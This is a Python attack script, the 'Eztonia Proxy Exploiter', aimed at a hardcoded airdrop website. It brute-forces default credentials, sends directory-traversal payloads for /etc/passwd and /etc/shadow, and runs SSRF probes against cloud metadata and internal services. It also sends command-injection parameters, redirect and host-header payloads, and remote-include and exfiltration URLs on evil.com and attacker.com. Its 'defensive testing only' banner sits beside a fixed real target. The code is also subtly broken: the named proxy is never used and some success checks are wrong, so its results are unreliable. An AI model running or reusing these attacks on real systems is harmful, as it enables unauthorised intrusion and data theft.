#!/usr/bin/env python3
"""
Eztonia Proxy Exploiter - Exploit through Eztonia Proxy
Author: ShadowScan Security Team
Purpose: Exploit target system through Eztonia proxy for advanced access
"""

import asyncio
import aiohttp
import json
import random
import string
import time
import re
import base64
import hashlib
from datetime import datetime
from typing import Dict, List, Any, Optional
import urllib.parse

class EztoniaProxyExploiter:
    def __init__(self, target_url: str, proxy_url: str = "http://eztonia.com:8080"):
        self.target_url = target_url
        self.proxy_url = proxy_url
        self.session = None
        self.access_token = None
        self.session_cookies = {}
        self.successful_access = []
        self.discovered_credentials = []
        self.admin_access = False
        self.shell_access = False
        self.results = {
            "scan_info": {
                "target_url": target_url,
                "proxy_url": proxy_url,
                "scan_timestamp": datetime.now().isoformat(),
                "scan_type": "Eztonia Proxy Exploiter",
                "scan_duration": "2-3 menit"
            },
            "summary": {
                "successful_logins": 0,
                "discovered_credentials": 0,
                "admin_access": False,
                "shell_access": False,
                "proxy_access": [],
                "exploit_success": False
            },
            "successful_logins": [],
            "discovered_credentials": [],
            "proxy_access": [],
            "exploit_success": False,
            "recommendations": []
        }

    async def __aenter__(self):
        # Configure session with proxy
        connector = aiohttp.TCPConnector()
        timeout = aiohttp.ClientTimeout(total=30)

        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def execute_eztonia_exploitation(self):
        """Execute Eztonia proxy exploitation"""
        print("üåê EZTONIA PROXY EXPLOITER")
        print("=" * 60)
        print(f"üéØ Target: {self.target_url}")
        print(f"üîó Proxy: {self.proxy_url}")
        print("=" * 60)
        print("‚ö†Ô∏è  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        # Execute exploitation methods through proxy
        await self.proxy_authentication_bypass()
        await self.proxy_directory_traversal()
        await self.proxy_ssrf_exploitation()
        await self.proxy_api_exploitation()
        await self.proxy_misconfiguration_exploitation()
        await self.proxy_protocol_tunneling()

        # Generate final report
        await self.generate_proxy_report()

    async def proxy_authentication_bypass(self):
        """Proxy-based authentication bypass"""
        print("üîê Proxy Authentication Bypass")

        # Authentication methods through proxy
        auth_methods = [
            # Basic Auth through proxy
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
            {"Authorization": "Basic cm9vdDpzb21l"},     # root:password
            {"Authorization": "Basic dGVzdDp0ZXN0"},     # test:test

            # Bearer tokens through proxy
            {"Authorization": "Bearer admin:admin"},
            {"Authorization": "Bearer admin_token"},
            {"Authorization": "Bearer root_token"},
            {"Authorization": "Bearer test_token"},

            # API keys through proxy
            {"X-API-Key": "admin_key"},
            {"X-API-Key": "root_key"},
            {"X-API-Key": "test_key"},
            {"X-API-Key": "secret_key"},

            # Session cookies through proxy
            {"Cookie": "session=admin123"},
            {"Cookie": "session=root123"},
            {"Cookie": "session=test123"},
            {"Cookie": "admin_session=admin"},
            {"Cookie": "user_session=admin"},

            # Headers through proxy
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"Proxy-Authorization": "Basic YWRtaW46YWRtaW4="},

            # Content manipulation through proxy
            {"Content-Type": "application/json"},
            {"Content-Type": "application/x-www-form-urlencoded"},
            {"Accept": "application/json"},
            {"Accept": "text/html"},
            {"Accept": "*/*"}
        ]

        # Login endpoints through proxy
        login_endpoints = [
            "/login",
            "/auth/login",
            "/admin/login",
            "/api/login",
            "/user/login",
            "/signin",
            "/auth/signin"
        ]

        # Critical credentials
        critical_credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "admin", "password": "admin123"},
            {"username": "admin", "password": "root"},
            {"username": "admin", "password": "toor"},
            {"username": "admin", "password": "test"},
            {"username": "admin", "password": "test123"},
            {"username": "admin", "password": "admin@123"},
            {"username": "admin", "password": "123456789"},
            {"username": "admin", "password": "qwerty"},
            {"username": "admin", "password": "abc123"},
            {"username": "admin", "password": "letmein"},
            {"username": "admin", "password": "welcome"},
            {"username": "admin", "password": "monkey"},
            {"username": "admin", "password": "password1"},
            {"username": "admin", "password": "admin1"},
            {"username": "admin", "password": "admin2"},
            {"username": "admin", "password": "admin3"},
        ]

        # Test login through proxy
        for endpoint in login_endpoints:
            for credential in critical_credentials:
                for auth_header in auth_methods:
                    try:
                        success = await self._test_proxy_login(endpoint, credential, auth_header)
                        if success:
                            print(f"üîê Proxy Login Success: {endpoint}")
                            self.admin_access = True
                            self.results["summary"]["exploit_success"] = True
                            return
                    except Exception:
                        continue

    async def _test_proxy_login(self, endpoint: str, credential: Dict[str, str], auth_header: Dict[str, str]) -> bool:
        """Test login through proxy"""
        url = f"{self.target_url}{endpoint}"

        try:
            # Combine auth header and credential
            headers = auth_header.copy()

            async with self.session.post(url, data=credential, headers=headers, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["dashboard", "admin", "panel", "welcome"]):
                        return True
                    elif response.status == 302:
                        # Check redirect location
                        location = response.headers.get('location', '')
                        if 'dashboard' in location.lower() or 'admin' in location.lower():
                            return True
        except Exception:
            pass

        # Try JSON format
        try:
            async with self.session.post(url, json=credential, headers=auth_header, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["dashboard", "admin", "panel", "welcome"]):
                        return True
        except Exception:
            pass

        return False

    async def proxy_directory_traversal(self):
        """Proxy-based directory traversal"""
        print("üìÅ Proxy Directory Traversal")

        # Directory traversal payloads through proxy
        traversal_payloads = [
            # Classic traversal
            "../../../../etc/passwd",
            "../../..//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",

            # Windows traversal
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",

            # PHP wrappers through proxy
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/resource=index.php",
            "zip:///var/www/html/backup.zip",
            "phar:///var/www/html/backup.phar",
            "data:text/plain;base64,SGVsbG8sIFdvcmxkIQ==",
            "expect://ls",
            "file:///etc/passwd",
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt"
        ]

        # Vulnerable endpoints through proxy
        vulnerable_endpoints = [
            "/download",
            "/file",
            "/view",
            "/read",
            "/open",
            "/load",
            "/include",
            "/require",
            "/page",
            "/template",
            "/theme",
            "/config",
            "/settings",
            "/backup",
            "/restore",
            "/import",
            "/export",
            "/file-upload",
            "/file-download",
            "/file-viewer",
            "/document",
            "/report",
            "/invoice",
            "/receipt",
            "/attachment"
        ]

        for endpoint in vulnerable_endpoints:
            for payload in traversal_payloads:
                try:
                    success = await self._test_proxy_traversal(endpoint, payload)
                    if success:
                        print(f"üìÅ Proxy Traversal Success: {endpoint}")
                        self.results["summary"]["proxy_access"].append({
                            "type": "directory_traversal",
                            "endpoint": endpoint,
                            "payload": payload,
                            "status": "success"
                        })
                except Exception:
                    continue

    async def _test_proxy_traversal(self, endpoint: str, payload: str) -> bool:
        """Test directory traversal through proxy"""
        url = f"{self.target_url}{endpoint}"
        params = {"file": payload, "path": payload, "template": payload}

        try:
            async with self.session.get(url, params=params, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["root:", "daemon:", "bin:", "sys:", "wheel:"]):
                        return True
                    elif len(content) > 100 and "error" not in content.lower():
                        # Base64 decode check
                        try:
                            decoded = base64.b64decode(content).decode('utf-8')
                            if any(keyword in decoded.lower() for keyword in ["root:", "daemon:", "bin:", "sys:"]):
                                return True
                        except:
                            pass
        except Exception:
            pass

        # Test POST through proxy
        try:
            async with self.session.post(url, data=params, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["root:", "daemon:", "bin:", "sys:", "wheel:"]):
                        return True
        except Exception:
            pass

        return False

    async def proxy_ssrf_exploitation(self):
        """Proxy-based SSRF exploitation"""
        print("üåê Proxy SSRF Exploitation")

        # SSRF payloads through proxy
        ssrf_payloads = [
            # Local network through proxy
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:27017",
            "http://localhost:80",
            "http://localhost:443",
            "http://127.0.0.1/anything",
            "http://[127.0.0.1]",

            # Internal network through proxy
            "http://192.168.1.1",
            "http://192.168.0.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://172.17.0.1",  # Docker default
            "http://host.docker.internal",

            # Cloud metadata through proxy
            "http://169.254.169.254",  # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/openstack/latest/",
            "http://169.254.169.254/hetzner/",

            # Internal services through proxy
            "http://database:3306",
            "http://mysql:3306",
            "http://postgres:5432",
            "http://redis:6379",
            "http://mongodb:27017",
            "http://elasticsearch:9200",
            "http://kafka:9092",
            "http://rabbitmq:5672",
            "http://consul:8500",
            "http://etcd:2379",
            "http://vault:8200",
            "http://grafana:3000",
            "http://prometheus:9090"
        ]

        # SSRF endpoints through proxy
        ssrf_endpoints = [
            "/proxy",
            "/request",
            "/fetch",
            "/download",
            "/load",
            "/include",
            "/redirect",
            "/redirect-to",
            "/go",
            "/url",
            "/link",
            "/fetch-url",
            "/fetch-data",
            "/load-data",
            "/include-url",
            "/proxy-url",
            "/redirect-url",
            "/visit",
            "/browse",
            "/open",
            "/stream",
            "/webhook",
            "/callback",
            "/notify",
            "/webhook-url",
            "/callback-url"
        ]

        for endpoint in ssrf_endpoints:
            for payload in ssrf_payloads:
                try:
                    success = await self._test_proxy_ssrf(endpoint, payload)
                    if success:
                        print(f"üåê Proxy SSRF Success: {endpoint}")
                        self.results["summary"]["proxy_access"].append({
                            "type": "ssrf",
                            "endpoint": endpoint,
                            "payload": payload,
                            "status": "success"
                        })
                except Exception:
                    continue

    async def _test_proxy_ssrf(self, endpoint: str, payload: str) -> bool:
        """Test SSRF through proxy"""
        url = f"{self.target_url}{endpoint}"
        params = {"url": payload, "target": payload, "host": payload}

        try:
            async with self.session.get(url, params=params, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["amazonaws", "compute/v1", "meta-data", "instance-id", "ami-id"]):
                        return True
                    elif any(keyword in content.lower() for keyword in ["localhost", "127.0.0.1", "192.168.", "10.", "172."]):
                        return True
                    elif "error" not in content.lower() and len(content) > 50:
                        return True
        except Exception:
            pass

        # Test POST through proxy
        try:
            async with self.session.post(url, data=params, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["amazonaws", "compute/v1", "meta-data", "instance-id", "ami-id"]):
                        return True
        except Exception:
            pass

        return False

    async def proxy_api_exploitation(self):
        """Proxy-based API exploitation"""
        print("üîå Proxy API Exploitation")

        # API endpoints through proxy
        api_endpoints = [
            "/api",
            "/api/v1",
            "/api/v2",
            "/api/v3",
            "/rest",
            "/rest/v1",
            "/rest/v2",
            "/graphql",
            "/graphql/v1",

            # Resource-specific endpoints
            "/api/users",
            "/api/admins",
            "/api/sessions",
            "/api/auth",
            "/api/tokens",
            "/api/config",
            "/api/settings",
            "/api/database",
            "/api/backup",
            "/api/logs",
            "/api/metrics",
            "/api/health",
            "/api/status",
            "/api/version",
            "/api/info"
        ]

        # API test parameters through proxy
        api_params = [
            {"action": "get", "resource": "admin"},
            {"action": "get", "resource": "config"},
            {"action": "get", "resource": "users"},
            {"action": "get", "resource": "database"},
            {"action": "read", "resource": "admin"},
            {"action": "read", "resource": "config"},
            {"action": "read", "resource": "users"},
            {"action": "read", "resource": "database"},
            {"query": "SELECT * FROM users"},
            {"query": "SELECT * FROM admin"},
            {"query": "SELECT * FROM config"},
            {"query": "SELECT * FROM database"},
            {"command": "whoami"},
            {"command": "id"},
            {"command": "pwd"},
            {"command": "ls -la"},
            {"cmd": "whoami"},
            {"cmd": "id"},
            {"cmd": "pwd"},
            {"cmd": "ls -la"},
            {"exec": "whoami"},
            {"exec": "id"},
            {"exec": "pwd"},
            {"exec": "ls -la"},
            {"run": "whoami"},
            {"run": "id"},
            {"run": "pwd"},
            {"run": "ls -la"}
        ]

        for endpoint in api_endpoints:
            for params in api_params:
                try:
                    success = await self._test_proxy_api(endpoint, params)
                    if success:
                        print(f"üîå Proxy API Success: {endpoint}")
                        self.results["summary"]["proxy_access"].append({
                            "type": "api",
                            "endpoint": endpoint,
                            "params": params,
                            "status": "success"
                        })
                except Exception:
                    continue

    async def _test_proxy_api(self, endpoint: str, params: Dict[str, str]) -> bool:
        """Test API through proxy"""
        url = f"{self.target_url}{endpoint}"

        try:
            async with self.session.get(url, params=params, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if len(content) > 20 and "error" not in content.lower():
                        return True
                elif response.status == 401 or response.status == 403:
                    # Authentication required through proxy
                    return True
        except Exception:
            pass

        # Test POST through proxy
        try:
            async with self.session.post(url, json=params, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if len(content) > 20 and "error" not in content.lower():
                        return True
        except Exception:
            pass

        return False

    async def proxy_misconfiguration_exploitation(self):
        """Proxy-based misconfiguration exploitation"""
        print("‚ö†Ô∏è Proxy Misconfiguration Exploitation")

        # Misconfigurations through proxy
        misconfigurations = [
            # Open redirects through proxy
            {"redirect": "javascript:alert('XSS')"},
            {"redirect": "data:text/html,<script>alert('XSS')</script>"},
            {"redirect": "file:///etc/passwd"},
            {"redirect": "ftp://attacker.com/steal"},
            {"redirect": "http://evil.com/steal"},

            # CORS misconfigurations through proxy
            {"origin": "http://evil.com"},
            {"origin": "http://localhost:3000"},
            {"origin": "http://127.0.0.1:3000"},
            {"origin": "file://"},
            {"origin": "null"},

            # Host header injection through proxy
            {"host": "attacker.com"},
            {"host": "localhost:3000"},
            {"host": "127.0.0.1:3000"},
            {"host": "airdrop.0gfoundation.evil.com"},

            # Referer header injection through proxy
            {"referer": "http://evil.com"},
            {"referer": "http://localhost:3000"},
            {"referer": "http://127.0.0.1:3000"},

            # User-Agent injection through proxy
            {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},
            {"user-agent": "curl/7.68.0"},
            {"user-agent": "python-requests/2.25.1"},
            {"user-agent": "Apache-HttpClient/4.5.13"}
        ]

        # Misconfig endpoints through proxy
        misconfig_endpoints = [
            "/redirect",
            "/callback",
            "/webhook",
            "/oauth",
            "/auth",
            "/login",
            "/api",
            "/rest",
            "/graphql",
            "/admin",
            "/dashboard"
        ]

        for endpoint in misconfig_endpoints:
            for misconfig in misconfigurations:
                try:
                    success = await self._test_proxy_misconfig(endpoint, misconfig)
                    if success:
                        print(f"‚ö†Ô∏è Proxy Misconfig Success: {endpoint}")
                        self.results["summary"]["proxy_access"].append({
                            "type": "misconfiguration",
                            "endpoint": endpoint,
                            "payload": misconfig,
                            "status": "success"
                        })
                except Exception:
                    continue

    async def _test_proxy_misconfig(self, endpoint: str, misconfig: Dict[str, str]) -> bool:
        """Test misconfiguration through proxy"""
        url = f"{self.target_url}{endpoint}"

        try:
            async with self.session.get(url, params=misconfig, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if "evil.com" in content.lower() or "localhost" in content.lower():
                        return True
        except Exception:
            pass

        return False

    async def proxy_protocol_tunneling(self):
        """Proxy-based protocol tunneling"""
        print("üîç Proxy Protocol Tunneling")

        # Protocol payloads through proxy
        protocol_payloads = [
            # File protocols through proxy
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///etc/shadow",
            "file:///proc/self/environ",
            "file:///C:/Windows/win.ini",
            "file:///C:/Windows/system.ini",
            "file:///C:/Windows/System32/drivers/etc/hosts",

            # Data protocols through proxy
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/plain,Hello World",
            "data:application/json,{\"test\": \"data\"}",
            "data:application/octet-stream,AAAAAA",

            # Custom protocols through proxy
            "javascript:alert('XSS')",
            "vbscript:msgbox('XSS')",
            "jar:file:///tmp/exploit.jar!/",
            "chrome://settings/",
            "chrome://extensions/",
            "about:config",
            "about:blank",
            "about:plugins",
            "about:cache",

            # Other protocols through proxy
            "ftp://attacker.com/steal",
            "ftps://attacker.com/steal",
            "sftp://attacker.com/steal",
            "ldap://attacker.com",
            "ldaps://attacker.com",
            "gopher://attacker.com",
            "telnet://attacker.com",
            "ssh://attacker.com",
            "irc://attacker.com",
            "ircs://attacker.com",
            "sip://attacker.com",
            "sips://attacker.com",
            "rsync://attacker.com",
            "tftp://attacker.com"
        ]

        # Protocol endpoints through proxy
        protocol_endpoints = [
            "/url",
            "/link",
            "/fetch",
            "/download",
            "/load",
            "/include",
            "/proxy",
            "/request",
            "/redirect",
            "/visit",
            "/browse",
            "/open",
            "/stream",
            "/play",
            "/view",
            "/display",
            "/show",
            "/render"
        ]

        for endpoint in protocol_endpoints:
            for protocol in protocol_payloads:
                try:
                    success = await self._test_proxy_protocol(endpoint, protocol)
                    if success:
                        print(f"üîç Proxy Protocol Success: {endpoint}")
                        self.results["summary"]["proxy_access"].append({
                            "type": "protocol",
                            "endpoint": endpoint,
                            "protocol": protocol,
                            "status": "success"
                        })
                except Exception:
                    continue

    async def _test_proxy_protocol(self, endpoint: str, protocol: str) -> bool:
        """Test protocol through proxy"""
        url = f"{self.target_url}{endpoint}"
        params = {"url": protocol, "target": protocol, "link": protocol}

        try:
            async with self.session.get(url, params=params, timeout=15) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["xss", "alert", "javascript", "data:", "file:"]):
                        return True
                    elif len(content) > 100 and "error" not in content.lower():
                        return True
        except Exception:
            pass

        return False

    async def generate_proxy_report(self):
        """Generate final proxy report"""
        report_filename = f"eztonia_proxy_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        # Update summary
        self.results["summary"]["successful_logins"] = len(self.results["successful_logins"])
        self.results["summary"]["admin_access"] = self.admin_access
        self.results["summary"]["shell_access"] = self.shell_access
        self.results["summary"]["exploit_success"] = self.admin_access or self.shell_access
        self.results["summary"]["proxy_access"] = self.results["summary"]["proxy_access"]

        # Add recommendations
        if self.admin_access or self.shell_access:
            self.results["recommendations"] = [
                "SYSTEM EXPLOITED THROUGH PROXY - Admin access achieved",
                "Immediate security response required",
                "Proxy security vulnerabilities confirmed",
                "Patch and audit necessary"
            ]
        elif self.results["summary"]["proxy_access"]:
            self.results["recommendations"] = [
                "Proxy-based vulnerabilities detected",
                "Security assessment required",
                "Proxy security controls need improvement",
                "Regular security audits recommended"
            ]
        else:
            self.results["recommendations"] = [
                "No proxy-based vulnerabilities found",
                "Proxy security appears robust",
                "Consider regular proxy security assessments",
                "Monitor for new proxy-based vulnerabilities"
            ]

        with open(report_filename, 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\nüåê EZTONIA PROXY SUMMARY:")
        print(f"   Admin Access: {self.admin_access}")
        print(f"   Shell Access: {self.shell_access}")
        print(f"   Exploit Success: {self.results['summary']['exploit_success']}")
        print(f"   Proxy Access Points: {len(self.results['summary']['proxy_access'])}")

        print(f"\nüìã Report: {report_filename}")
        print("üåê EZTONIA PROXY EXPLOITATION COMPLETED! üåê")

async def main():
    target_url = "https://airdrop.0gfoundation.ai"
    proxy_url = "http://eztonia.com:8080"  # Default Eztonia proxy

    async with EztoniaProxyExploiter(target_url, proxy_url) as exploiter:
        await exploiter.execute_eztonia_exploitation()

if __name__ == "__main__":
    asyncio.run(main())